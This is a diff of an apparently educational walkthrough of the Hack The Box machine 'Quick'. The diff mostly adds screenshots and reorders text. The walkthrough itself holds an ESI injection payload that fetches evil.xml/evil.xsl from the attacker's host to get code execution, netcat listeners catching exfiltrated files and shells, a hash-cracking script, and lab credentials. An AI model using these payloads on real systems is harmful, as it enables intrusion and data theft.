@@ -1,6 +1,6 @@
 ---
 description: >-
-  Zweilosec's write-up on the hard difficulty Linux machine Quick from
+  Zweilosec's write-up on the hard difficulty Linux machine Qu from
   https://hackthebox.eu
 ---
 
@@ -51,7 +51,15 @@ Nmap done: 1 IP address (1 host up) scanned in 131.16 seconds
 
 2 ports open, ssh \(22\) and http on 9001
 
-dirbuster showed an error, but login page at [http://10.10.10.186:9001/login.php](http://10.10.10.186:9001/login.php) and clients page at clients.php
+![](../../.gitbook/assets/1-quick.png)
+
+dirbuster showed an error, but login page at [http://10.10.10.186:9001/login.php](http://10.10.10.186:9001/login.php) 
+
+![](../../.gitbook/assets/2-login.png)
+
+and clients page at clients.php
+
+![](../../.gitbook/assets/4-clients.png)
 
 ```text
 1    QConsulting Pvt Ltd        UK
@@ -190,6 +198,8 @@ The QUIC protocol, which HTTP/3 uses UDP for a fast connectionless "session". Si
 [https://geekflare.com/http3-test/](https://geekflare.com/http3-test/) [https://caniuse.com/\#feat=http3](https://caniuse.com/#feat=http3) google chrome \(or chromium\) can enable quic
 
 [https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj\_l\_YShP40GLQE/edit\#](https://docs.google.com/document/d/1lmL9EF6qKrk7gbazY8bIdvq3Pno2Xj_l_YShP40GLQE/edit#) chrome://flags/
+
+![](../../.gitbook/assets/7-quic.png)
 
 about http/3 [https://daniel.haxx.se/http3-explained/](https://daniel.haxx.se/http3-explained/) [https://github.com/curl/curl/wiki/QUIC-implementation](https://github.com/curl/curl/wiki/QUIC-implementation) [https://quicwg.org/](https://quicwg.org/)
 
@@ -503,6 +513,8 @@ Both PDFs downloaded with no issues. The Connectivity.pdf contained some interes
 
 ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/password.png) Quick4cc3$$
 
+![](../../.gitbook/assets/8-password-pdf.png)
+
 The Connectivity.pdf had a link that lead back to the first site: `http://quick.htb`, while the other doc linked back to the https version. Maybe this is a clue to log into the first site?
 
 It took a little bit of guesswork to figure out the next part since I couldn't see any clues that pointed to any email addresses other than the three `@quick.htb` ones. I first tried iterating through all of the names I had found while adding `@quick.htb` on the the end but that didn't get me any successes. Next I decided that since they provided the company names and countries for each of the users, that I could make potential email addresses out of those.
@@ -556,15 +568,23 @@ email=elisa%40wink.co.uk&password=Quick4cc3%24%24
 
 ## Initial Foothold
 
-Now that I was logged into the portal, I had access to /home, /ticket, and /search seen in my dirbuster output earlier. Also, now that I am logged in I can try to see if the Esigate vulnerability I had read about earlier can be exploited [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) [https://github.com/esigate/esigate/issues/209](https://github.com/esigate/esigate/issues/209) CVE-2018-1000854
+![](../../.gitbook/assets/10-logged-in.png)
 
-`<esi:include src="http://10.10.15.57:9088/evil.xml" stylesheet="http://10.10.15.57:9088/evil.xsl"> </esi:include>` need xml file to reflect code into
+Now that I was logged into the portal, I had access to /home, /ticket, and /search seen in my dirbuster output earlier. 
+
+![](../../.gitbook/assets/12-raise-ticket.png)
+
+![](../../.gitbook/assets/11-ticket.png)
+
+Also, now that I am logged in I can try to see if the Esigate vulnerability I had read about earlier can be exploited [https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/](https://www.gosecure.net/blog/2019/05/02/esi-injection-part-2-abusing-specific-implementations/) [https://github.com/esigate/esigate/issues/209](https://github.com/esigate/esigate/issues/209) CVE-2018-1000854
 
 ```text
 zweilos@kali:~/htb/quick$ python -m SimpleHTTPServer 9088
 Serving HTTP on 0.0.0.0 port 9088 ...
 10.10.10.186 - - [11/Aug/2020 21:15:36] "GET /evil.xsl HTTP/1.1" 200 -
 ```
+
+`<esi:include src="http://10.10.15.57:9088/evil.xml" stylesheet="http://10.10.15.57:9088/evil.xsl"> </esi:include>` need xml file to reflect code into
 
 The vulnerability exists in the ticket search function!
 
@@ -590,6 +610,12 @@ Serving HTTP on 0.0.0.0 port 9088 ...
 ```
 
 After quite a bit of head-scratching and testing, I have decided that you can only use a filename once. After that it gives a 404 error for a file that definitely exists. This must be something the server is doing...
+
+![](../../.gitbook/assets/18-im-in.png)
+
+![](../../.gitbook/assets/18.5-im-in.png)
+
+![](../../.gitbook/assets/19-ticket.png)
 
 ```text
 zweilos@kali:~/htb/quick$ nc -lvnp 13371 > passwd
@@ -921,6 +947,8 @@ docker0: flags=4099 mtu 1500 inet 172.17.0.1 netmask 255.255.0.0 broadcast 172.1
 
 -rw------- 1 sam sam 32768 Aug 15 17:08 /tmp/hsperfdata\_sam/926 [https://bugzilla.redhat.com/show\_bug.cgi?id=1123870](https://bugzilla.redhat.com/show_bug.cgi?id=1123870) `/var/www/jobs` writeable folder but owned by root in `/var/www/printers` job.php [https://github.com/mike42/escpos-php](https://github.com/mike42/escpos-php)
 
+![](../../.gitbook/assets/20-index.php-internal.png)
+
 db.php
 
 ```php
@@ -930,6 +958,8 @@ $conn = new mysqli("localhost","db_adm","db_p4ss","quick");
 ```
 
 srvadm@quick.htb
+
+![](../../.gitbook/assets/21-jobs.png)
 
 ```text
 sam@quick:/var/www/printer$ cat job.php
@@ -1020,8 +1050,6 @@ mysql> select * from users;
 2 rows in set (0.00 sec)
 ```
 
-I found the users table which may or may not have new creds in it...
-
 ```text
 mysql> select * from tickets;
 +----------+-----------+------------------------------------------------------------------------------------------------------------------------+--------+
@@ -1036,7 +1064,11 @@ mysql> select * from tickets;
 9 rows in set (0.00 sec)
 ```
 
+I found the users table which may or may not have new creds in it...
+
 I also found a list of the tickets that I submitted...the lazy admin still hasn't gotten around to helping me with my issues!
+
+![](../../.gitbook/assets/22-login.php-crypt.png)
 
 for the password "hash" I found, the login.php contained this line which explained it:
 
@@ -1046,7 +1078,7 @@ $password = md5(crypt($password,'fa'));
 
 wrote a script to crack the password using: [https://stackoverflow.com/questions/13246597/how-to-read-a-large-file-line-by-line](https://stackoverflow.com/questions/13246597/how-to-read-a-large-file-line-by-line)
 
-```text
+```php
 <?php
 if ($wordlist = fopen("/home/zweilos/rockyou_utf8.txt", "r")) {
     while ((!feof($wordlist))) {
@@ -1087,6 +1119,8 @@ Communicate with a printer with an Ethernet interface using netcat:
 php hello-world.php | nc 10.x.x.x. 9100
 ```
 
+![](../../.gitbook/assets/23-ports.conf.png)
+
 ```text
 # If you just change the port or add more ports here, you will likely also
 # have to change the VirtualHost statement in
@@ -1106,7 +1140,11 @@ While poking around in the /etc/apache2 directory I noticed the `ports.conf` fil
 </VirtualHost>
 ```
 
-Here was the information I was looking for! There was a virtual host on port 80 at `printerv2.quick.htb` running under user `srvadm`. This may allow me exploit that jobs folder I had found in `/var/www/html`. I added the page to my `/etc/hosts` file, but I was still blocked from accessing the page since it was on port 80 \(which was still not open to the world\).
+Here was the information I was looking for! There was a virtual host on port 80 at `printerv2.quick.htb` running under user `srvadm`. This may allow me exploit that jobs folder I had found in `/var/www/html`. 
+
+![](../../.gitbook/assets/25-connection-reset.png)
+
+I added the page to my `/etc/hosts` file, but I was still blocked from accessing the page since it was on port 80 \(which was still not open to the world\).
 
 ```text
 sam@quick:/etc/apache2$ curl http://printerv2.quick.htb
@@ -1289,9 +1327,19 @@ I logged in successfully, now to test my port forwarding in the browser. ![](htt
 zweilos@kali:~/htb/quick$ ssh -L 40905:127.0.0.1:80 sam@quick.htb
 ```
 
-After fixing the IP, I was able to connect to the virtual hosted page. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/virtual_printer.png) This led me to a login page. Since I knew that the page was running as `srvadm`, I figured the credentials must be the ones I had found for that user in the MySQL database earlier. [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+After fixing the IP, I was able to connect to the virtual hosted page. ![](https://github.com/zweilosec/htb-writeups/tree/de76ed6e78e992dd3769f7fa850ef9167e04b2c0/linux-machines/hard/virtual_printer.png) 
+
+![](../../.gitbook/assets/26-quick-redux.png)
+
+This led me to a login page. Since I knew that the page was running as `srvadm`, I figured the credentials must be the ones I had found for that user in the MySQL database earlier. [http://pentestmonkey.net/tools/web-shells/php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
 
 ### Getting a shell
+
+![](../../.gitbook/assets/27-printer-home.png)
+
+![](../../.gitbook/assets/27-add-printer.png)
+
+![](../../.gitbook/assets/28-myprinter.png)
 
 ```text
 zweilos@kali:~/htb/quick$ nc -lvnp 9100
@@ -1455,6 +1503,8 @@ srvadm@quick:~$ sudo -l
 [sudo] password for srvadm:
 ```
 
+![](../../.gitbook/assets/29-viminfo%20%281%29.png)
+
 ```text
 srvadm@quick:~/.local/share/nano$cat search_history
 2013
@@ -1508,6 +1558,8 @@ Connection closed by foreign host.
  [https://www.cvedetails.com/vulnerability-list/vendor\_id-10410/product\_id-34824/Eclipse-Jetty.html](https://www.cvedetails.com/vulnerability-list/vendor_id-10410/product_id-34824/Eclipse-Jetty.html)
 
  [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
+
+![](../../.gitbook/assets/30-printer-auth.png)
 
 ```text
 srvadm@quick:~/.cache$ ls -la
